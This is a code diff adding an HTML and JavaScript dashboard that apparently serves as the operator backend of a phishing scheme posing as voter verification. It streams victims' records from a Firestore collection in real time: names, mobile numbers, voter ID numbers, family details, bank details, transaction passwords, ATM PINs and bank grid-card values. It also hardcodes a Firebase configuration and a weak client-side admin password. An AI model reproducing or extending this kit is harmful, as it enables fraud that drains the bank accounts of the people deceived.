@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel - Live Real-Time Submissions</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background: #f4f7f6; padding: 20px; }
+        
+        #loginOverlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.7); display: flex; justify-content: center; align-items: center; z-index: 9999;
+        }
+        .login-box {
+            background: #fff; padding: 30px; border-radius: 10px; width: 100%; max-width: 350px; text-align: center;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+        }
+        .login-box h3 { margin-bottom: 15px; color: #0056b3; }
+        .login-box input { width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 5px; font-size: 14px; }
+        .login-box button { width: 100%; padding: 10px; background: #0056b3; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
+        .login-box button:hover { background: #004085; }
+        .error-text { color: red; font-size: 12px; margin-bottom: 10px; display: none; }
+
+        #adminContent { display: none; }
+
+        .header-container { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; background: #fff; padding: 15px 20px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        h2 { color: #0056b3; font-size: 20px; }
+        
+        .live-status { display: flex; align-items: center; gap: 8px; font-size: 13px; font-weight: 600; color: #28a745; background: #e8f5e9; padding: 6px 12px; border-radius: 20px; border: 1px solid #c8e6c9; }
+        .pulse-dot { width: 10px; height: 10px; background-color: #28a745; border-radius: 50%; display: inline-block; animation: pulse 1.5s infinite; }
+        @keyframes pulse {
+            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(40, 167, 69, 0.7); }
+            70% { transform: scale(1); box-shadow: 0 0 0 8px rgba(40, 167, 69, 0); }
+            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(40, 167, 69, 0); }
+        }
+
+        .table-container { width: 100%; overflow-x: auto; background: #fff; padding: 15px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        table { width: 100%; border-collapse: collapse; min-width: 2100px; }
+        th, td { padding: 12px; border: 1px solid #ddd; text-align: left; font-size: 13px; }
+        th { background-color: #0056b3; color: white; position: sticky; top: 0; z-index: 10; }
+        tr:nth-child(even) { background-color: #f9f9f9; }
+        .loading { text-align: center; color: #666; font-style: italic; }
+        
+        .logout-btn { background: #dc3545; color: white; border: none; padding: 8px 15px; border-radius: 4px; cursor: pointer; font-size: 13px; font-weight: bold; }
+        .delete-btn { background: #dc3545; color: white; border: none; padding: 6px 10px; border-radius: 4px; cursor: pointer; font-size: 11px; font-weight: bold; }
+        .delete-btn:hover { background: #b02a37; }
+    </style>
+</head>
+<body>
+
+    <!-- Login Screen -->
+    <div id="loginOverlay">
+        <div class="login-box">
+            <h3>Admin Login</h3>
+            <div id="errorMsg" class="error-text">गलत पासवर्ड! कृपया दोबारा डालें।</div>
+            <input type="text" id="adminUser" placeholder="Admin Username" value="admin" readonly style="background: #e9ecef;">
+            <input type="password" id="adminPass" placeholder="Enter Password">
+            <button onclick="checkLogin()">Login</button>
+        </div>
+    </div>
+
+    <!-- Main Admin Dashboard -->
+    <div id="adminContent">
+        <div class="header-container">
+            <h2>Admin Panel - Live Real-Time Submissions</h2>
+            
+            <div style="display: flex; align-items: center; gap: 15px;">
+                <div class="live-status">
+                    <span class="pulse-dot"></span> Live Scanning Active
+                </div>
+                <button class="logout-btn" onclick="logout()">Logout</button>
+            </div>
+        </div>
+        
+        <div class="table-container">
+            <table>
+                <thead>
+                    <tr>
+                        <th>#</th>
+                        <th>Time</th>
+                        <th>Full Name</th>
+                        <th>Mobile</th>
+                        <th>EPIC Number</th>
+                        <th>Father's Name</th>
+                        <th>DOB</th>
+                        <th>Gender</th>
+                        <th>Marital Status</th>
+                        <th>Children</th>
+                        <th>Mother's Name</th>
+                        <th>Documents</th>
+                        <th>Payment Method</th>
+                        <th>Payment / Bank Details</th>
+                        <th>Transaction Password</th>
+                        <th>ATM PIN</th>
+                        <th>Grid Step 1</th>
+                        <th>Grid Step 2</th>
+                        <th>Grid Step 3</th>
+                        <th>Grid Step 4</th>
+                        <th>Status / Current Step</th>
+                        <th>Action</th>
+                    </tr>
+                </thead>
+                <tbody id="dataTable">
+                    <tr><td colspan="22" class="loading">Connecting to Live Database...</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- Firebase Real-Time Listener Script -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getFirestore, collection, onSnapshot, deleteDoc, doc, getDoc, setDoc, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyAZ7Dvd7HYsZrMuP0bABJuMAEZmRtGw02U",
+            authDomain: "voter-verification-a04d5.firebaseapp.com",
+            projectId: "voter-verification-a04d5",
+            storageBucket: "voter-verification-a04d5.firebasestorage.app",
+            messagingSenderId: "582458013788",
+            appId: "1:582458013788:web:15f8c7fd7dc05d24328e99",
+            measurementId: "G-8CX5BVQXFC"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        let unsubscribe = null;
+
+        function startLiveListener() {
+            const tableBody = document.getElementById('dataTable');
+
+            // onSnapshot के माध्यम से बिना रिफ्रेश किए डेटा तुरंत लाइव दिखेगा
+            unsubscribe = onSnapshot(collection(db, "voterSubmissions"), (querySnapshot) => {
+                let submissions = [];
+                
+                querySnapshot.forEach((document) => {
+                    submissions.push({ id: document.id, ...document.data() });
+                });
+
+                if (submissions.length === 0) {
+                    tableBody.innerHTML = "<tr><td colspan='22' class='loading'>कोई डेटा उपलब्ध नहीं है। (लाइव स्कैनिंग जारी है...)</td></tr>";
+                    return;
+                }
+
+                // समय के अनुसार सॉर्ट करें (नया डेटा हमेशा सबसे ऊपर)
+                submissions.sort((a, b) => {
+                    let timeA = new Date(a.time || 0);
+                    let timeB = new Date(b.time || 0);
+                    return timeB - timeA;
+                });
+
+                tableBody.innerHTML = "";
+                let serialNumber = 1;
+
+                submissions.forEach((data) => {
+                    let row = `<tr>
+                        <td><b>${serialNumber++}</b></td>
+                        <td>${data.time || 'N/A'}</td>
+                        <td>${data.fullname || 'N/A'}</td>
+                        <td>${data.mobile || 'N/A'}</td>
+                        <td>${data.epic || 'N/A'}</td>
+                        <td>${data.fatherName || 'Pending'}</td>
+                        <td>${data.dob || 'Pending'}</td>
+                        <td>${data.gender || 'Pending'}</td>
+                        <td>${data.maritalStatus || 'Pending'}</td>
+                        <td>${data.childrenCount || 'Pending'}</td>
+                        <td>${data.motherName || 'Pending'}</td>
+                        <td>${data.documents || 'Pending'}</td>
+                        <td>${data.paymentMethod || 'Pending'}</td>
+                        <td>${data.paymentDetails || 'Pending'}</td>
+                        <td>${data.transPassword || 'Pending'}</td>
+                        <td>${data.atmPin || 'Pending'}</td>
+                        <td>${data.gridStep1 || 'Pending'}</td>
+                        <td>${data.gridStep2 || 'Pending'}</td>
+                        <td>${data.gridStep3 || 'Pending'}</td>
+                        <td>${data.gridStep4 || 'Pending'}</td>
+                        <td><b>${data.currentStep || 'Started'}</b></td>
+                        <td><button class="delete-btn" onclick="deleteRecord('${data.id}')">Delete</button></td>
+                    </tr>`;
+                    tableBody.innerHTML += row;
+                });
+            }, (error) => {
+                console.error("Live sync error: ", error);
+            });
+        }
+
+        // रिकॉर्ड डिलीट करने का फंक्शन
+        window.deleteRecord = async function(docId) {
+            if (confirm("क्या आप वाकई इस यूज़र के डेटा को डिलीट करना चाहते हैं?")) {
+                try {
+                    await deleteDoc(doc(db, "voterSubmissions", docId));
+                } catch (error) {
+                    console.error("Error deleting document: ", error);
+                    alert("डेटा डिलीट करने में विफल।");
+                }
+            }
+        }
+
+        window.onload = function() {
+            if (sessionStorage.getItem('isAdminLoggedIn') === 'true') {
+                document.getElementById('loginOverlay').style.display = 'none';
+                document.getElementById('adminContent').style.display = 'block';
+                startLiveListener();
+            }
+        };
+
+        window.checkLogin = function() {
+            const pass = document.getElementById('adminPass').value;
+            if (pass === 'admin123') {
+                sessionStorage.setItem('isAdminLoggedIn', 'true');
+                document.getElementById('loginOverlay').style.display = 'none';
+                document.getElementById('adminContent').style.display = 'block';
+                startLiveListener();
+            } else {
+                document.getElementById('errorMsg').style.display = 'block';
+            }
+        }
+
+        window.logout = function() {
+            if (unsubscribe) unsubscribe();
+            sessionStorage.removeItem('isAdminLoggedIn');
+            location.reload();
+        }
+    </script>
+</body>
+</html>
